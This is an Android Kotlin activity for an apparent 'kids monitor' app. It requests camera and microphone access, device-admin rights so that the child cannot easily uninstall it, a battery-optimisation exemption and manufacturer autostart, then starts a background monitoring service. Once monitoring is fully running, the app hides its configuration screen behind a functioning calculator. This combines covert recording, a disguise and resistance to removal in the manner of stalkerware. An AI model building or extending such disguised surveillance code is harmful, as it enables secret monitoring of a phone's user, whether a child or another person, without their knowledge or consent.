package com.kidsmonitor

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kidsmonitor.databinding.ActivityMainBinding
import com.kidsmonitor.receivers.MyDeviceAdminReceiver
import com.kidsmonitor.services.MonitorService

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName
    private var isServiceRunning = false

    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.POST_NOTIFICATIONS)
    } else {
        arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
    }

    private val serviceStatusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == MonitorService.ACTION_STATUS_UPDATE) {
                isServiceRunning = intent.getBooleanExtra(MonitorService.EXTRA_IS_RUNNING, false)
                val progress = intent.getIntExtra(MonitorService.EXTRA_PROGRESS, 0)
                updateStatus(isServiceRunning, progress)
            }
        }
    }

    private val autoStartPermissionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        with(sharedPrefs.edit()) {
            putBoolean("auto_start_enabled", true)
            apply()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        init()
        initCalculator()
        binding.btnAdmin.setOnClickListener {
            enableDeviceAdmin()
        }
        binding.btnAutoStart.setOnClickListener {
            requestAutoStartPermission()
        }
    }

    private fun init() {
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
    }

    override fun onResume() {
        super.onResume()
        updateUi()
        val filter = IntentFilter(MonitorService.ACTION_STATUS_UPDATE)
        registerReceiver(serviceStatusReceiver, filter)
    }

    override fun onPause() {
        super.onPause()
        unregisterReceiver(serviceStatusReceiver)
    }

    private fun updateUi() {
        if (isDeviceAdminEnabled()) {
            binding.btnAdmin.visibility = View.GONE
            binding.tvStatus.visibility = View.VISIBLE
            binding.progressBar.visibility = View.VISIBLE
            requestIgnoreBatteryOptimizations()
            if (isFirstLaunch()) {
                requestAutoStartPermission()
            }
            if (!isServiceRunning) {
                startMonitorService()
            }
        } else {
            binding.btnAdmin.visibility = View.VISIBLE
            binding.tvStatus.visibility = View.GONE
            binding.progressBar.visibility = View.GONE
            if (checkPermissions()) {
                enableDeviceAdmin()
            } else {
                requestPermissions()
            }
        }
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        val autoStartEnabled = sharedPrefs.getBoolean("auto_start_enabled", false)
        if (!autoStartEnabled) {
            binding.btnAutoStart.visibility = View.VISIBLE
        } else {
            binding.btnAutoStart.visibility = View.GONE
        }
    }

    private fun isDeviceAdminEnabled(): Boolean {
        return devicePolicyManager.isAdminActive(componentName)
    }

    private fun enableDeviceAdmin() {
        if (checkPermissions()) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allow kids admin so it cannot be easily uninstalled by your child.")
            }
            startActivity(intent)
        } else {
            requestPermissions()
        }
    }

    private fun startMonitorService() {
        if (checkPermissions()) {
            val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
            with(sharedPrefs.edit()) {
                putBoolean("monitoring_enabled", true)
                apply()
            }

            val intent = Intent(this, MonitorService::class.java).apply {
                action = com.kidsmonitor.utils.MonitorActions.ACTION_START_MONITORING
            }
            startService(intent)
        } else {
            requestPermissions()
        }
    }

    private fun checkPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            requiredPermissions,
            PERMISSION_REQUEST_CODE
        )
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun requestAutoStartPermission() {
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        try {
            val intent = Intent()
            val manufacturer = android.os.Build.MANUFACTURER
            if ("xiaomi".equals(manufacturer, ignoreCase = true)) {
                intent.component = ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            } else if ("oppo".equals(manufacturer, ignoreCase = true)) {
                intent.component = ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            } else if ("vivo".equals(manufacturer, ignoreCase = true)) {
                intent.component = ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            } else if ("Letv".equals(manufacturer, ignoreCase = true)) {
                intent.component = ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            } else if ("Honor".equals(manufacturer, ignoreCase = true)) {
                intent.component = ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            }

            if (intent.resolveActivity(packageManager) != null) {
                autoStartPermissionLauncher.launch(intent)
            } else {
                with(sharedPrefs.edit()) {
                    putBoolean("auto_start_enabled", true)
                    apply()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        with(sharedPrefs.edit()) {
            putBoolean("first_launch", false)
            apply()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                // Permissions granted, the UI will be updated in onResume
            }
        }
    }

    private fun isFirstLaunch(): Boolean {
        val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
        return sharedPrefs.getBoolean("first_launch", true)
    }

    private fun updateStatus(isRunning: Boolean, progress: Int) {
        if (isRunning) {
            binding.tvStatus.text = "Status: Running ($progress%)"
            binding.progressBar.progress = progress
            val color = when (progress) {
                in 0..25 -> R.color.red
                in 26..50 -> R.color.yellow
                in 51..75 -> R.color.blue
                else -> R.color.green
            }
            binding.progressBar.progressTintList = ContextCompat.getColorStateList(this, color)
            if (progress == 100) {
                binding.monitorConfigLayout.visibility = View.GONE
                binding.calculatorLayout.visibility = View.VISIBLE
            } else {
                binding.monitorConfigLayout.visibility = View.VISIBLE
                binding.calculatorLayout.visibility = View.GONE
            }
        } else {
            binding.tvStatus.text = "Status: Not running"
            binding.progressBar.visibility = View.INVISIBLE
            binding.monitorConfigLayout.visibility = View.VISIBLE
            binding.calculatorLayout.visibility = View.GONE
        }
    }

    private var calcValue = ""
    private var calcOperator = ""
    private var calcOperand: Double? = null
    private var clearOnNextDigit = false

    private fun initCalculator() {
        val numberButtons = listOf(
            binding.btn0 to "0", binding.btn1 to "1", binding.btn2 to "2",
            binding.btn3 to "3", binding.btn4 to "4", binding.btn5 to "5",
            binding.btn6 to "6", binding.btn7 to "7", binding.btn8 to "8",
            binding.btn9 to "9"
        )
        
        for ((button, value) in numberButtons) {
            button.setOnClickListener {
                appendNumber(value)
            }
        }
        
        binding.btnC.setOnClickListener {
            clearCalculator()
        }

        binding.btnDelete.setOnClickListener {
            deleteLastDigit()
        }

        binding.btnPercent.setOnClickListener {
            applyPercent()
        }

        binding.btnDot.setOnClickListener {
            appendDot()
        }

        binding.btnToggleSign.setOnClickListener {
            toggleSign()
        }
        
        binding.btnPlus.setOnClickListener { selectOperator("+") }
        binding.btnMinus.setOnClickListener { selectOperator("-") }
        binding.btnMultiply.setOnClickListener { selectOperator("×") }
        binding.btnDivide.setOnClickListener { selectOperator("÷") }
        
        binding.btnEquals.setOnClickListener {
            calculateResult()
        }
    }

    private fun appendNumber(digit: String) {
        if (clearOnNextDigit) {
            calcValue = ""
            clearOnNextDigit = false
        }
        if (calcValue == "0" || calcValue == "") {
            calcValue = digit
        } else {
            calcValue += digit
        }
        binding.tvCalcDisplay.text = calcValue
    }

    private fun deleteLastDigit() {
        if (clearOnNextDigit) {
            calcValue = "0"
            clearOnNextDigit = false
        } else if (calcValue.isNotEmpty() && calcValue != "0") {
            calcValue = calcValue.dropLast(1)
            if (calcValue.isEmpty() || calcValue == "-") {
                calcValue = "0"
            }
        }
        binding.tvCalcDisplay.text = calcValue
    }

    private fun applyPercent() {
        val num = calcValue.toDoubleOrNull()
        if (num != null) {
            val result = num / 100.0
            calcValue = formatResult(result)
            binding.tvCalcDisplay.text = calcValue
            clearOnNextDigit = true
        }
    }

    private fun appendDot() {
        if (clearOnNextDigit) {
            calcValue = "0."
            clearOnNextDigit = false
        } else if (!calcValue.contains(".")) {
            if (calcValue.isEmpty()) {
                calcValue = "0."
            } else {
                calcValue += "."
            }
        }
        binding.tvCalcDisplay.text = calcValue
    }

    private fun toggleSign() {
        if (calcValue.isNotEmpty() && calcValue != "0") {
            calcValue = if (calcValue.startsWith("-")) {
                calcValue.substring(1)
            } else {
                "-$calcValue"
            }
            binding.tvCalcDisplay.text = calcValue
        }
    }

    private fun clearCalculator() {
        calcValue = "0"
        calcOperator = ""
        calcOperand = null
        clearOnNextDigit = false
        binding.tvCalcDisplay.text = calcValue
        binding.tvCalcHistory.text = ""
    }

    private fun selectOperator(op: String) {
        calcOperand = calcValue.toDoubleOrNull()
        calcOperator = op
        clearOnNextDigit = true
        
        val firstValFormatted = formatResult(calcOperand ?: 0.0)
        binding.tvCalcHistory.text = "$firstValFormatted $op"
    }

    private fun calculateResult() {
        val secondOperand = calcValue.toDoubleOrNull()
        val firstOperand = calcOperand
        if (firstOperand != null && secondOperand != null && calcOperator.isNotEmpty()) {
            val result = when (calcOperator) {
                "+" -> firstOperand + secondOperand
                "-" -> firstOperand - secondOperand
                "×" -> firstOperand * secondOperand
                "÷" -> if (secondOperand != 0.0) firstOperand / secondOperand else Double.NaN
                else -> 0.0
            }
            
            val firstFormatted = formatResult(firstOperand)
            val secondFormatted = formatResult(secondOperand)
            binding.tvCalcHistory.text = "$firstFormatted $calcOperator $secondFormatted ="
            
            calcValue = if (result.isNaN()) {
                "Error"
            } else {
                formatResult(result)
            }
            
            binding.tvCalcDisplay.text = calcValue
            calcOperand = null
            calcOperator = ""
            clearOnNextDigit = true
        }
    }

    private fun formatResult(num: Double): String {
        return if (num % 1 == 0.0) {
            num.toInt().toString()
        } else {
            String.format(java.util.Locale.US, "%.6f", num).trimEnd('0').trimEnd('.')
        }
    }

    companion object {
        private const val PERMISSION_REQUEST_CODE = 101
    }
}
